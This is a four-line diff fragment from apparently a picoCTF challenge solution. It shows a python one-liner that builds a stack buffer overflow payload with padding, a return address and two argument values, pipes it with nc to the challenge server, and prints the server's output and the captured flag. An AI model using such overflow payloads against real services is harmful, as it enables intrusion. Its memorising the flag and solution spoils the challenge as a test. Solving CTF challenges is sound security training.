@@ -1,0 +1,4 @@
+$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*112 + b'\x96\x92\x04\x08' + b'A'*4 + b'\x0d\xf0\xfe\xca\x0d\xf0\x0d\xf0\n')" | nc saturn.picoctf.net 59686
+Please enter your string:
+���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAA
+picoCTF{argum3nt5_4_d4yZ_b3fd8f66}
